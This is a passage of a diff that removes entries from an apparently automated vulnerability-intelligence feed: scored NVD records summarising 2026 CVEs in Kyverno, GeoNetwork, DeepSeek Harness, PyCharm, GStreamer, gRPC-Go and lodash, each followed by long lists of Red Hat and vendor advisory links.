-      "https://access.redhat.com/errata/RHSA-2026:43038",
-      "https://access.redhat.com/errata/RHSA-2026:43052",
-      "https://access.redhat.com/errata/RHSA-2026:43692",
-      "https://access.redhat.com/errata/RHSA-2026:44622",
-      "https://access.redhat.com/errata/RHSA-2026:44624",
-      "https://access.redhat.com/errata/RHSA-2026:46395",
-      "https://access.redhat.com/errata/RHSA-2026:47149",
-      "https://access.redhat.com/errata/RHSA-2026:47735",
-      "https://access.redhat.com/errata/RHSA-2026:47737",
-      "https://access.redhat.com/errata/RHSA-2026:47952",
-      "https://access.redhat.com/errata/RHSA-2026:49702",
-      "https://access.redhat.com/errata/RHSA-2026:49712",
-      "https://access.redhat.com/errata/RHSA-2026:50300",
-      "https://access.redhat.com/errata/RHSA-2026:50843",
-      "https://access.redhat.com/errata/RHSA-2026:51033",
-      "https://access.redhat.com/errata/RHSA-2026:51112",
-      "https://access.redhat.com/errata/RHSA-2026:51187",
-      "https://access.redhat.com/errata/RHSA-2026:51194",
-      "https://access.redhat.com/errata/RHSA-2026:51341",
-      "https://access.redhat.com/errata/RHSA-2026:52826",
-      "https://access.redhat.com/errata/RHSA-2026:53374",
-      "https://access.redhat.com/errata/RHSA-2026:53412",
-      "https://access.redhat.com/errata/RHSA-2026:53413",
-      "https://access.redhat.com/errata/RHSA-2026:53415",
-      "https://access.redhat.com/errata/RHSA-2026:53530",
-      "https://access.redhat.com/errata/RHSA-2026:54191",
-      "https://access.redhat.com/errata/RHSA-2026:54274",
-      "https://access.redhat.com/errata/RHSA-2026:54283",
-      "https://access.redhat.com/errata/RHSA-2026:54284",
-      "https://access.redhat.com/errata/RHSA-2026:54285",
-      "https://access.redhat.com/errata/RHSA-2026:54286",
-      "https://access.redhat.com/errata/RHSA-2026:54287",
-      "https://access.redhat.com/errata/RHSA-2026:54395",
-      "https://access.redhat.com/errata/RHSA-2026:54401",
-      "https://access.redhat.com/errata/RHSA-2026:54435",
-      "https://access.redhat.com/errata/RHSA-2026:54441",
-      "https://access.redhat.com/errata/RHSA-2026:54531",
-      "https://access.redhat.com/errata/RHSA-2026:54580",
-      "https://access.redhat.com/errata/RHSA-2026:54757",
-      "https://access.redhat.com/errata/RHSA-2026:56143",
-      "https://access.redhat.com/errata/RHSA-2026:56223",
-      "https://access.redhat.com/errata/RHSA-2026:56340",
-      "https://access.redhat.com/errata/RHSA-2026:56431",
-      "https://access.redhat.com/errata/RHSA-2026:57194",
-      "https://access.redhat.com/errata/RHSA-2026:57541",
-      "https://access.redhat.com/errata/RHSA-2026:57649",
-      "https://access.redhat.com/errata/RHSA-2026:57845",
-      "https://access.redhat.com/errata/RHSA-2026:59546",
-      "https://access.redhat.com/errata/RHSA-2026:59549",
-      "https://access.redhat.com/errata/RHSA-2026:59562",
-      "https://access.redhat.com/errata/RHSA-2026:60315",
-      "https://access.redhat.com/errata/RHSA-2026:60354",
-      "https://access.redhat.com/errata/RHSA-2026:60387",
-      "https://access.redhat.com/errata/RHSA-2026:60520",
-      "https://access.redhat.com/errata/RHSA-2026:61245",
-      "https://access.redhat.com/errata/RHSA-2026:61253",
-      "https://access.redhat.com/errata/RHSA-2026:62549",
-      "https://access.redhat.com/errata/RHSA-2026:63134",
-      "https://access.redhat.com/errata/RHSA-2026:65126",
-      "https://access.redhat.com/errata/RHSA-2026:65153",
-      "https://access.redhat.com/errata/RHSA-2026:65359",
-      "https://access.redhat.com/errata/RHSA-2026:65534",
-      "https://access.redhat.com/errata/RHSA-2026:65886",
-      "https://access.redhat.com/errata/RHSA-2026:66016",
-      "https://access.redhat.com/errata/RHSA-2026:66022",
-      "https://access.redhat.com/errata/RHSA-2026:66432",
-      "https://access.redhat.com/security/cve/CVE-2026-39821",
-      "https://bugzilla.redhat.com/show_bug.cgi?id=2480756",
-      "https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-39821.json"
-    ],
-    "source": "NVD",
-    "cisa_kev": false,
-    "epss": 0.7,
-    "epss_percentile": 50.9,
-    "tags": [
-      "priv_esc"
-    ],
-    "intel_score": 83.0,
-    "reasons": [
-      "recently modified (last 48h)",
-      "priv_esc+25"
-    ]
-  },
-  {
-    "cve_id": "CVE-2026-54523",
-    "published": "2026-08-26T15:16:48.910",
-    "last_modified": "2026-09-09T21:09:13.080",
-    "cvss_v3": 9.6,
-    "severity": "CRITICAL",
-    "affected": [],
-    "summary": "Kyverno is a policy engine designed for cloud native platform engineering teams. From 1.18.0 until 1.18.2, the NamespacedMutatingPolicy CEL compiler exposes the generator library to matchConditions, allowing a namespace-scoped policy to invoke generator.apply(namespace, resources) with an arbitrary target namespace. The validation in pkg/cel/policies/mpol/validate.go checks that the policy compiles but does not enforce namespace scope, and GenerateResources in pkg/cel/libs/context.go does not reject the cross-namespace target. A user who can create NamespacedMutatingPolicy objects in one namespace can cause the admission controller, operating with cluster-wide privileges, to create ConfigMaps, NetworkPolicies, Secrets, RoleBindings, and other resources in another namespace, enabling unauthorized modification and potential privilege escalation. This issue is fixed in version 1.18.2.",
-    "references": [
-      "https://github.com/kyverno/kyverno/commit/0919553c0ea1904f8d891280c92018da97946a06",
-      "https://github.com/kyverno/kyverno/commit/5164bcdeda5b57678bc2d7a03ecc2cbb02982dae",
-      "https://github.com/kyverno/kyverno/pull/16238",
-      "https://github.com/kyverno/kyverno/releases/tag/v1.18.2",
-      "https://github.com/kyverno/kyverno/security/advisories/GHSA-79gf-7frw-68m9",
-      "https://github.com/kyverno/sdk/commit/6573937441443e1ba5af9fbb28d5c0f20297f9df",
-      "https://github.com/kyverno/kyverno/security/advisories/GHSA-79gf-7frw-68m9"
-    ],
-    "source": "NVD",
-    "cisa_kev": false,
-    "epss": 0.4,
-    "epss_percentile": 33.7,
-    "tags": [
-      "priv_esc"
-    ],
-    "intel_score": 83.0,
-    "reasons": [
-      "recently modified (last 48h)",
-      "priv_esc+25"
-    ]
-  },
-  {
-    "cve_id": "CVE-2026-63219",
-    "published": "2026-09-03T18:17:22.997",
-    "last_modified": "2026-09-09T21:09:13.080",
-    "cvss_v3": 8.6,
-    "severity": "HIGH",
-    "affected": [],
-    "summary": "GeoNetwork is a catalog application to manage spatially referenced resources. Prior to versions 4.4.12 and 4.2.17, the API endpoint for creating a new formatter via file upload is unprotected and allows the upload of external uncontrolled files. An unauthenticated attacker can upload arbitrary `.xsl` or `.zip` formatter files to the server.  An unauthenticated attacker can write arbitrary files into the GeoNetwork formatter directory. On its own this constitutes unauthorized write access to server storage. The issue is patched in GeoNetwork versions 4.4.12 and 4.2.17.",
-    "references": [
-      "https://docs.geonetwork-opensource.org/4.2/overview/change-log/version-4.2.17",
-      "https://docs.geonetwork-opensource.org/4.4/overview/change-log/version-4.4.12",
-      "https://github.com/geonetwork/core-geonetwork/pull/9346",
-      "https://github.com/geonetwork/core-geonetwork/security/advisories/GHSA-mh22-prqr-vf42",
-      "https://thehackernews.com/2026/09/geonetwork-fixes-unauthenticated-rce.html"
-    ],
-    "source": "NVD",
-    "cisa_kev": false,
-    "epss": 0.5,
-    "epss_percentile": 39.0,
-    "tags": [
-      "rce"
-    ],
-    "intel_score": 83.0,
-    "reasons": [
-      "recently modified (last 48h)",
-      "rce+30"
-    ]
-  },
-  {
-    "cve_id": "CVE-2026-82533",
-    "published": "2026-09-08T17:18:36.887",
-    "last_modified": "2026-09-10T15:17:47.593",
-    "cvss_v3": 9.6,
-    "severity": "CRITICAL",
-    "affected": [],
-    "summary": "DeepSeek Harness before 0.1.2-alpha.1 contains an authentication bypass vulnerability that grants unauthenticated access to its local HTTP agent-control API by accepting a client-supplied loopback Host header in place of validating the actual TCP connection origin. On the default configuration, a confined tool-executed process can reach the loopback API without any port exposure and use it to escape its own OS sandbox, escalate to unconfined execution, and disable the approval prompt. When the port is externally reachable via tunnel, SSH forward, or reverse proxy, a remote attacker can exploit the same flaw to create sessions, execute arbitrary commands, and exfiltrate stored conversation transcripts without credentials.",
-    "references": [
-      "https://github.com/deepseek-ai/deepseek-harness/commit/3e24087bfaeabe40b58ba2f7b936895b8f93fe27",
-      "https://github.com/deepseek-ai/deepseek-harness/releases/tag/dsh-v0.1.2-alpha.1",
-      "https://www.ox.security/blog/cve-2026-82533-deepseek-harness-ai-agent-sandbox-escape/",
-      "https://www.vulncheck.com/advisories/deepseek-harness-alpha-1-authentication-bypass-via-host-header-spoofing"
-    ],
-    "source": "NVD",
-    "cisa_kev": false,
-    "epss": 0.6,
-    "epss_percentile": 47.9,
-    "tags": [
-      "auth_bypass"
-    ],
-    "intel_score": 83.0,
-    "reasons": [
-      "recently modified (last 48h)",
-      "auth_bypass+25"
-    ]
-  },
-  {
-    "cve_id": "CVE-2026-75060",
-    "published": "2026-08-17T16:17:53.227",
-    "last_modified": "2026-09-10T14:09:33.207",
-    "cvss_v3": 8.4,
-    "severity": "HIGH",
-    "affected": [],
-    "summary": "In JetBrains PyCharm before 2026.2.1 code execution was possible via unauthenticated Jupyter MCP tools",
-    "references": [
-      "https://www.jetbrains.com/privacy-security/issues-fixed/"
-    ],
-    "source": "NVD",
-    "cisa_kev": false,
-    "epss": 0.1,
-    "epss_percentile": 4.1,
-    "tags": [
-      "rce"
-    ],
-    "intel_score": 82.0,
-    "reasons": [
-      "recently modified (last 48h)",
-      "rce+30"
-    ]
-  },
-  {
-    "cve_id": "CVE-2026-19387",
-    "published": "2026-08-10T03:16:40.223",
-    "last_modified": "2026-09-10T17:17:02.130",
-    "cvss_v3": 7.6,
-    "severity": "HIGH",
-    "affected": [],
-    "summary": "A heap out-of-bounds write vulnerability was found in the GStreamer gst-plugins-bad adpcmdec element when decoding IMA/DVI ADPCM audio. Insufficient validation of the per-block sample count for multi-channel streams allows a crafted WAV file to cause writes beyond the allocated output buffer. This can lead to application crash, denial of service, memory corruption, or potentially arbitrary code execution when untrusted media is processed.",
-    "references": [
-      "https://access.redhat.com/errata/RHSA-2026:55433",
-      "https://access.redhat.com/errata/RHSA-2026:55865",
-      "https://access.redhat.com/errata/RHSA-2026:56521",
-      "https://access.redhat.com/errata/RHSA-2026:65122",
-      "https://access.redhat.com/errata/RHSA-2026:65123",
-      "https://access.redhat.com/errata/RHSA-2026:65124",
-      "https://access.redhat.com/errata/RHSA-2026:66406",
-      "https://access.redhat.com/errata/RHSA-2026:66407",
-      "https://access.redhat.com/security/cve/CVE-2026-19387",
-      "https://bugzilla.redhat.com/show_bug.cgi?id=2513015",
-      "https://gitlab.freedesktop.org/gstreamer/gstreamer/-/merge_requests/12235",
-      "https://gstreamer.freedesktop.org/releases/1.28/"
-    ],
-    "source": "NVD",
-    "cisa_kev": false,
-    "epss": 0.3,
-    "epss_percentile": 21.7,
-    "tags": [
-      "dos",
-      "rce"
-    ],
-    "intel_score": 81.0,
-    "reasons": [
-      "recently modified (last 48h)",
-      "rce+30",
-      "dos+3"
-    ]
-  },
-  {
-    "cve_id": "CVE-2026-33186",
-    "published": "2026-03-20T23:16:45.180",
-    "last_modified": "2026-09-11T13:17:30.047",
-    "cvss_v3": 9.1,
-    "severity": "CRITICAL",
-    "affected": [],
-    "summary": "gRPC-Go is the Go language implementation of gRPC. Versions prior to 1.79.3 have an authorization bypass resulting from improper input validation of the HTTP/2 `:path` pseudo-header. The gRPC-Go server was too lenient in its routing logic, accepting requests where the `:path` omitted the mandatory leading slash (e.g., `Service/Method` instead of `/Service/Method`). While the server successfully routed these requests to the correct handler, authorization interceptors (including the official `grpc/authz` package) evaluated the raw, non-canonical path string. Consequently, \"deny\" rules defined using canonical paths (starting with `/`) failed to match the incoming request, allowing it to bypass the policy if a fallback \"allow\" rule was present. This affects gRPC-Go servers that use path-based authorization interceptors, such as the official RBAC implementation in `google.golang.org/grpc/authz` or custom interceptors relying on `info.FullMethod` or `grpc.Method(ctx)`; AND that have a security policy contains specific \"deny\" rules for canonical paths but allows other requests by default (a fallback \"allow\" rule). The vulnerability is exploitable by an attacker who can send raw HTTP/2 frames with malformed `:path` headers directly to the gRPC server. The fix in version 1.79.3 ensures that any request with a `:path` that does not start with a leading slash is immediately rejected with a `codes.Unimplemented` error, preventing it from reaching authorization interceptors or handlers with a non-canonical path string. While upgrading is the most secure and recommended path, users can mitigate the vulnerability using one of the following methods: Use a validating interceptor (recommended mitigation); infrastructure-level normalization; and/or policy hardening.",
-    "references": [
-      "https://github.com/grpc/grpc-go/security/advisories/GHSA-p77j-4mvh-x3m3",
-      "https://access.redhat.com/errata/RHSA-2026:10093",
-      "https://access.redhat.com/errata/RHSA-2026:10094",
-      "https://access.redhat.com/errata/RHSA-2026:10105",
-      "https://access.redhat.com/errata/RHSA-2026:10107",
-      "https://access.redhat.com/errata/RHSA-2026:10125",
-      "https://access.redhat.com/errata/RHSA-2026:10126",
-      "https://access.redhat.com/errata/RHSA-2026:10130",
-      "https://access.redhat.com/errata/RHSA-2026:10131",
-      "https://access.redhat.com/errata/RHSA-2026:10153",
-      "https://access.redhat.com/errata/RHSA-2026:10155",
-      "https://access.redhat.com/errata/RHSA-2026:10158",
-      "https://access.redhat.com/errata/RHSA-2026:10172",
-      "https://access.redhat.com/errata/RHSA-2026:10175",
-      "https://access.redhat.com/errata/RHSA-2026:10698",
-      "https://access.redhat.com/errata/RHSA-2026:10705",
-      "https://access.redhat.com/errata/RHSA-2026:10706",
-      "https://access.redhat.com/errata/RHSA-2026:11070",
-      "https://access.redhat.com/errata/RHSA-2026:11408",
-      "https://access.redhat.com/errata/RHSA-2026:11803",
-      "https://access.redhat.com/errata/RHSA-2026:11856",
-      "https://access.redhat.com/errata/RHSA-2026:11916",
-      "https://access.redhat.com/errata/RHSA-2026:11996",
-      "https://access.redhat.com/errata/RHSA-2026:12116",
-      "https://access.redhat.com/errata/RHSA-2026:12118",
-      "https://access.redhat.com/errata/RHSA-2026:12119",
-      "https://access.redhat.com/errata/RHSA-2026:12277",
-      "https://access.redhat.com/errata/RHSA-2026:12279",
-      "https://access.redhat.com/errata/RHSA-2026:12283",
-      "https://access.redhat.com/errata/RHSA-2026:12337",
-      "https://access.redhat.com/errata/RHSA-2026:13548",
-      "https://access.redhat.com/errata/RHSA-2026:13791",
-      "https://access.redhat.com/errata/RHSA-2026:13829",
-      "https://access.redhat.com/errata/RHSA-2026:14775",
-      "https://access.redhat.com/errata/RHSA-2026:15092",
-      "https://access.redhat.com/errata/RHSA-2026:17123",
-      "https://access.redhat.com/errata/RHSA-2026:17448",
-      "https://access.redhat.com/errata/RHSA-2026:17459",
-      "https://access.redhat.com/errata/RHSA-2026:17468",
-      "https://access.redhat.com/errata/RHSA-2026:17474",
-      "https://access.redhat.com/errata/RHSA-2026:17475",
-      "https://access.redhat.com/errata/RHSA-2026:17598",
-      "https://access.redhat.com/errata/RHSA-2026:17599",
-      "https://access.redhat.com/errata/RHSA-2026:17789",
-      "https://access.redhat.com/errata/RHSA-2026:18068",
-      "https://access.redhat.com/errata/RHSA-2026:18585",
-      "https://access.redhat.com/errata/RHSA-2026:19099",
-      "https://access.redhat.com/errata/RHSA-2026:19108",
-      "https://access.redhat.com/errata/RHSA-2026:19109",
-      "https://access.redhat.com/errata/RHSA-2026:19135",
-      "https://access.redhat.com/errata/RHSA-2026:19207",
-      "https://access.redhat.com/errata/RHSA-2026:19353",
-      "https://access.redhat.com/errata/RHSA-2026:19375",
-      "https://access.redhat.com/errata/RHSA-2026:19712",
-      "https://access.redhat.com/errata/RHSA-2026:19719",
-      "https://access.redhat.com/errata/RHSA-2026:19720",
-      "https://access.redhat.com/errata/RHSA-2026:19721",
-      "https://access.redhat.com/errata/RHSA-2026:20034",
-      "https://access.redhat.com/errata/RHSA-2026:20035",
-      "https://access.redhat.com/errata/RHSA-2026:20041",
-      "https://access.redhat.com/errata/RHSA-2026:20042",
-      "https://access.redhat.com/errata/RHSA-2026:20088",
-      "https://access.redhat.com/errata/RHSA-2026:20089",
-      "https://access.redhat.com/errata/RHSA-2026:20322",
-      "https://access.redhat.com/errata/RHSA-2026:20436",
-      "https://access.redhat.com/errata/RHSA-2026:20943",
-      "https://access.redhat.com/errata/RHSA-2026:20946",
-      "https://access.redhat.com/errata/RHSA-2026:21017",
-      "https://access.redhat.com/errata/RHSA-2026:21657",
-      "https://access.redhat.com/errata/RHSA-2026:21658",
-      "https://access.redhat.com/errata/RHSA-2026:21691",
-      "https://access.redhat.com/errata/RHSA-2026:21692",
-      "https://access.redhat.com/errata/RHSA-2026:21696",
-      "https://access.redhat.com/errata/RHSA-2026:21697",
-      "https://access.redhat.com/errata/RHSA-2026:21703",
-      "https://access.redhat.com/errata/RHSA-2026:21704",
-      "https://access.redhat.com/errata/RHSA-2026:21709",
-      "https://access.redhat.com/errata/RHSA-2026:21710",
-      "https://access.redhat.com/errata/RHSA-2026:21769",
-      "https://access.redhat.com/errata/RHSA-2026:21931",
-      "https://access.redhat.com/errata/RHSA-2026:21932",
-      "https://access.redhat.com/errata/RHSA-2026:22347",
-      "https://access.redhat.com/errata/RHSA-2026:22423",
-      "https://access.redhat.com/errata/RHSA-2026:22450",
-      "https://access.redhat.com/errata/RHSA-2026:22465",
-      "https://access.redhat.com/errata/RHSA-2026:22485",
-      "https://access.redhat.com/errata/RHSA-2026:22645",
-      "https://access.redhat.com/errata/RHSA-2026:22689",
-      "https://access.redhat.com/errata/RHSA-2026:22714",
-      "https://access.redhat.com/errata/RHSA-2026:22800",
-      "https://access.redhat.com/errata/RHSA-2026:22937",
-      "https://access.redhat.com/errata/RHSA-2026:22959",
-      "https://access.redhat.com/errata/RHSA-2026:22961",
-      "https://access.redhat.com/errata/RHSA-2026:23228",
-      "https://access.redhat.com/errata/RHSA-2026:23234",
-      "https://access.redhat.com/errata/RHSA-2026:23235",
-      "https://access.redhat.com/errata/RHSA-2026:23241",
-      "https://access.redhat.com/errata/RHSA-2026:23246",
-      "https://access.redhat.com/errata/RHSA-2026:23247",
-      "https://access.redhat.com/errata/RHSA-2026:23345",
-      "https://access.redhat.com/errata/RHSA-2026:24484",
-      "https://access.redhat.com/errata/RHSA-2026:24506",
-      "https://access.redhat.com/errata/RHSA-2026:24535",
-      "https://access.redhat.com/errata/RHSA-2026:24536",
-      "https://access.redhat.com/errata/RHSA-2026:24759",
-      "https://access.redhat.com/errata/RHSA-2026:24853",
-      "https://access.redhat.com/errata/RHSA-2026:24977",
-      "https://access.redhat.com/errata/RHSA-2026:25009",
-      "https://access.redhat.com/errata/RHSA-2026:25045",
-      "https://access.redhat.com/errata/RHSA-2026:25127",
-      "https://access.redhat.com/errata/RHSA-2026:25182",
-      "https://access.redhat.com/errata/RHSA-2026:25183",
-      "https://access.redhat.com/errata/RHSA-2026:25187",
-      "https://access.redhat.com/errata/RHSA-2026:25194",
-      "https://access.redhat.com/errata/RHSA-2026:25195",
-      "https://access.redhat.com/errata/RHSA-2026:25201",
-      "https://access.redhat.com/errata/RHSA-2026:26412",
-      "https://access.redhat.com/errata/RHSA-2026:26413",
-      "https://access.redhat.com/errata/RHSA-2026:26416",
-      "https://access.redhat.com/errata/RHSA-2026:26420",
-      "https://access.redhat.com/errata/RHSA-2026:26519",
-      "https://access.redhat.com/errata/RHSA-2026:26568",
-      "https://access.redhat.com/errata/RHSA-2026:26997",
-      "https://access.redhat.com/errata/RHSA-2026:26999",
-      "https://access.redhat.com/errata/RHSA-2026:27001",
-      "https://access.redhat.com/errata/RHSA-2026:27004",
-      "https://access.redhat.com/errata/RHSA-2026:27063",
-      "https://access.redhat.com/errata/RHSA-2026:27076",
-      "https://access.redhat.com/errata/RHSA-2026:27712",
-      "https://access.redhat.com/errata/RHSA-2026:27856",
-      "https://access.redhat.com/errata/RHSA-2026:27892",
-      "https://access.redhat.com/errata/RHSA-2026:27893",
-      "https://access.redhat.com/errata/RHSA-2026:27901",
-      "https://access.redhat.com/errata/RHSA-2026:27957",
-      "https://access.redhat.com/errata/RHSA-2026:28047",
-      "https://access.redhat.com/errata/RHSA-2026:28893",
-      "https://access.redhat.com/errata/RHSA-2026:28964",
-      "https://access.redhat.com/errata/RHSA-2026:29079",
-      "https://access.redhat.com/errata/RHSA-2026:29082",
-      "https://access.redhat.com/errata/RHSA-2026:29854",
-      "https://access.redhat.com/errata/RHSA-2026:34049",
-      "https://access.redhat.com/errata/RHSA-2026:34097",
-      "https://access.redhat.com/errata/RHSA-2026:34099",
-      "https://access.redhat.com/errata/RHSA-2026:34100",
-      "https://access.redhat.com/errata/RHSA-2026:34364",
-      "https://access.redhat.com/errata/RHSA-2026:34769",
-      "https://access.redhat.com/errata/RHSA-2026:34794",
-      "https://access.redhat.com/errata/RHSA-2026:34795",
-      "https://access.redhat.com/errata/RHSA-2026:36611",
-      "https://access.redhat.com/errata/RHSA-2026:36621",
-      "https://access.redhat.com/errata/RHSA-2026:36651",
-      "https://access.redhat.com/errata/RHSA-2026:36796",
-      "https://access.redhat.com/errata/RHSA-2026:36882",
-      "https://access.redhat.com/errata/RHSA-2026:37192",
-      "https://access.redhat.com/errata/RHSA-2026:37275",
-      "https://access.redhat.com/errata/RHSA-2026:37580",
-      "https://access.redhat.com/errata/RHSA-2026:37585",
-      "https://access.redhat.com/errata/RHSA-2026:40022",
-      "https://access.redhat.com/errata/RHSA-2026:40030",
-      "https://access.redhat.com/errata/RHSA-2026:40118",
-      "https://access.redhat.com/errata/RHSA-2026:40792",
-      "https://access.redhat.com/errata/RHSA-2026:40795",
-      "https://access.redhat.com/errata/RHSA-2026:40945",
-      "https://access.redhat.com/errata/RHSA-2026:40984",
-      "https://access.redhat.com/errata/RHSA-2026:41019",
-      "https://access.redhat.com/errata/RHSA-2026:41928",
-      "https://access.redhat.com/errata/RHSA-2026:41941",
-      "https://access.redhat.com/errata/RHSA-2026:41944",
-      "https://access.redhat.com/errata/RHSA-2026:42049",
-      "https://access.redhat.com/errata/RHSA-2026:42051",
-      "https://access.redhat.com/errata/RHSA-2026:42150",
-      "https://access.redhat.com/errata/RHSA-2026:42151",
-      "https://access.redhat.com/errata/RHSA-2026:42240",
-      "https://access.redhat.com/errata/RHSA-2026:42644",
-      "https://access.redhat.com/errata/RHSA-2026:43225",
-      "https://access.redhat.com/errata/RHSA-2026:43227",
-      "https://access.redhat.com/errata/RHSA-2026:43253",
-      "https://access.redhat.com/errata/RHSA-2026:43331",
-      "https://access.redhat.com/errata/RHSA-2026:43692",
-      "https://access.redhat.com/errata/RHSA-2026:44233",
-      "https://access.redhat.com/errata/RHSA-2026:44235",
-      "https://access.redhat.com/errata/RHSA-2026:47728",
-      "https://access.redhat.com/errata/RHSA-2026:47952",
-      "https://access.redhat.com/errata/RHSA-2026:48699",
-      "https://access.redhat.com/errata/RHSA-2026:48790",
-      "https://access.redhat.com/errata/RHSA-2026:50758",
-      "https://access.redhat.com/errata/RHSA-2026:50843",
-      "https://access.redhat.com/errata/RHSA-2026:51033",
-      "https://access.redhat.com/errata/RHSA-2026:53728",
-      "https://access.redhat.com/errata/RHSA-2026:53763",
-      "https://access.redhat.com/errata/RHSA-2026:53773",
-      "https://access.redhat.com/errata/RHSA-2026:53804",
-      "https://access.redhat.com/errata/RHSA-2026:54191",
-      "https://access.redhat.com/errata/RHSA-2026:54274",
-      "https://access.redhat.com/errata/RHSA-2026:54286",
-      "https://access.redhat.com/errata/RHSA-2026:54531",
-      "https://access.redhat.com/errata/RHSA-2026:54757",
-      "https://access.redhat.com/errata/RHSA-2026:56366",
-      "https://access.redhat.com/errata/RHSA-2026:56431",
-      "https://access.redhat.com/errata/RHSA-2026:56789",
-      "https://access.redhat.com/errata/RHSA-2026:56854",
-      "https://access.redhat.com/errata/RHSA-2026:56912",
-      "https://access.redhat.com/errata/RHSA-2026:56959",
-      "https://access.redhat.com/errata/RHSA-2026:57013",
-      "https://access.redhat.com/errata/RHSA-2026:57365",
-      "https://access.redhat.com/errata/RHSA-2026:59833",
-      "https://access.redhat.com/errata/RHSA-2026:60146",
-      "https://access.redhat.com/errata/RHSA-2026:61245",
-      "https://access.redhat.com/errata/RHSA-2026:6174",
-      "https://access.redhat.com/errata/RHSA-2026:6428",
-      "https://access.redhat.com/errata/RHSA-2026:6564",
-      "https://access.redhat.com/errata/RHSA-2026:6802",
-      "https://access.redhat.com/errata/RHSA-2026:7110",
-      "https://access.redhat.com/errata/RHSA-2026:7128",
-      "https://access.redhat.com/errata/RHSA-2026:7245",
-      "https://access.redhat.com/errata/RHSA-2026:8151",
-      "https://access.redhat.com/errata/RHSA-2026:8338",
-      "https://access.redhat.com/errata/RHSA-2026:8433",
-      "https://access.redhat.com/errata/RHSA-2026:8449",
-      "https://access.redhat.com/errata/RHSA-2026:8483",
-      "https://access.redhat.com/errata/RHSA-2026:8484",
-      "https://access.redhat.com/errata/RHSA-2026:8490",
-      "https://access.redhat.com/errata/RHSA-2026:8491",
-      "https://access.redhat.com/errata/RHSA-2026:8493",
-      "https://access.redhat.com/errata/RHSA-2026:9385",
-      "https://access.redhat.com/errata/RHSA-2026:9388",
-      "https://access.redhat.com/errata/RHSA-2026:9440",
-      "https://access.redhat.com/errata/RHSA-2026:9448",
-      "https://access.redhat.com/errata/RHSA-2026:9453",
-      "https://access.redhat.com/errata/RHSA-2026:9872",
-      "https://access.redhat.com/security/cve/CVE-2026-33186",
-      "https://bugzilla.redhat.com/show_bug.cgi?id=2449833",
-      "https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-33186.json"
-    ],
-    "source": "NVD",
-    "cisa_kev": false,
-    "epss": 1.6,
-    "epss_percentile": 73.8,
-    "tags": [
-      "auth_bypass"
-    ],
-    "intel_score": 80.5,
-    "reasons": [
-      "recently modified (last 48h)",
-      "auth_bypass+25"
-    ]
-  },
-  {
-    "cve_id": "CVE-2026-4800",
-    "published": "2026-03-31T20:16:29.660",
-    "last_modified": "2026-09-10T13:20:23.210",
-    "cvss_v3": 8.1,
-    "severity": "HIGH",
-    "affected": [],
-    "summary": "Impact:\n\nThe fix for CVE-2021-23337 (https://github.com/advisories/GHSA-35jh-r3h4-6jhm) added validation for the variable option in _.template but did not apply the same validation to options.imports key names. Both paths flow into the same Function() constructor sink.\n\nWhen an application passes untrusted input as options.imports key names, an attacker can inject default-parameter expressions that execute arbitrary code at template compilation time.\n\nAdditionally, _.template uses assignInWith to merge imports, which enumerates inherited properties via for..in. If Object.prototype has been polluted by any other vector, the polluted keys are copied into the imports object and passed to Function().\n\nPatches:\n\nUsers should upgrade to version 4.18.0.\n\nWorkarounds:\n\nDo not pass untrusted input as key names in options.imports. Only use developer-controlled, static key names.",
-    "references": [
-      "https://cna.openjsf.org/security-advisories.html",
-      "https://github.com/advisories/GHSA-35jh-r3h4-6jhm",
-      "https://github.com/lodash/lodash/commit/3469357cff396a26c363f8c1b5a91dde28ba4b1c",
-      "https://access.redhat.com/errata/RHBA-2026:21387",
-      "https://access.redhat.com/errata/RHSA-2026:10131",
-      "https://access.redhat.com/errata/RHSA-2026:10175",
-      "https://access.redhat.com/errata/RHSA-2026:10710",
-      "https://access.redhat.com/errata/RHSA-2026:10713",
-      "https://access.redhat.com/errata/RHSA-2026:11454",
-      "https://access.redhat.com/errata/RHSA-2026:11469",
-      "https://access.redhat.com/errata/RHSA-2026:11470",
-      "https://access.redhat.com/errata/RHSA-2026:11471",
-      "https://access.redhat.com/errata/RHSA-2026:11493",
-      "https://access.redhat.com/errata/RHSA-2026:11494",
-      "https://access.redhat.com/errata/RHSA-2026:11495",
-      "https://access.redhat.com/errata/RHSA-2026:11516",
-      "https://access.redhat.com/errata/RHSA-2026:12277",
-      "https://access.redhat.com/errata/RHSA-2026:12279",
-      "https://access.redhat.com/errata/RHSA-2026:13545",
-      "https://access.redhat.com/errata/RHSA-2026:13553",
-      "https://access.redhat.com/errata/RHSA-2026:13571",
-      "https://access.redhat.com/errata/RHSA-2026:13826",
-      "https://access.redhat.com/errata/RHSA-2026:14870",
-      "https://access.redhat.com/errata/RHSA-2026:14871",
-      "https://access.redhat.com/errata/RHSA-2026:16874",
-      "https://access.redhat.com/errata/RHSA-2026:17448",
-      "https://access.redhat.com/errata/RHSA-2026:17468",
-      "https://access.redhat.com/errata/RHSA-2026:17469",
-      "https://access.redhat.com/errata/RHSA-2026:17547",
-      "https://access.redhat.com/errata/RHSA-2026:17549",
-      "https://access.redhat.com/errata/RHSA-2026:17550",
-      "https://access.redhat.com/errata/RHSA-2026:17598",
-      "https://access.redhat.com/errata/RHSA-2026:17789",
-      "https://access.redhat.com/errata/RHSA-2026:19008",
-      "https://access.redhat.com/errata/RHSA-2026:19167",
-      "https://access.redhat.com/errata/RHSA-2026:19409",
-      "https://access.redhat.com/errata/RHSA-2026:19410",
-      "https://access.redhat.com/errata/RHSA-2026:19712",
-      "https://access.redhat.com/errata/RHSA-2026:20041",
-      "https://access.redhat.com/errata/RHSA-2026:20042",
-      "https://access.redhat.com/errata/RHSA-2026:20943",
-      "https://access.redhat.com/errata/RHSA-2026:20946",
-      "https://access.redhat.com/errata/RHSA-2026:21658",
-      "https://access.redhat.com/errata/RHSA-2026:22619",
-      "https://access.redhat.com/errata/RHSA-2026:24331",
-      "https://access.redhat.com/errata/RHSA-2026:24762",
-      "https://access.redhat.com/errata/RHSA-2026:24977",
-      "https://access.redhat.com/errata/RHSA-2026:29795",
-      "https://access.redhat.com/errata/RHSA-2026:34100",
-      "https://access.redhat.com/errata/RHSA-2026:34342",
-      "https://access.redhat.com/errata/RHSA-2026:34608",
-      "https://access.redhat.com/errata/RHSA-2026:36621",
-      "https://access.redhat.com/errata/RHSA-2026:36651",
-      "https://access.redhat.com/errata/RHSA-2026:37186",
-      "https://access.redhat.com/errata/RHSA-2026:40118",
-      "https://access.redhat.com/errata/RHSA-2026:40795",
-      "https://access.redhat.com/errata/RHSA-2026:40945",
-      "https://access.redhat.com/errata/RHSA-2026:40984",
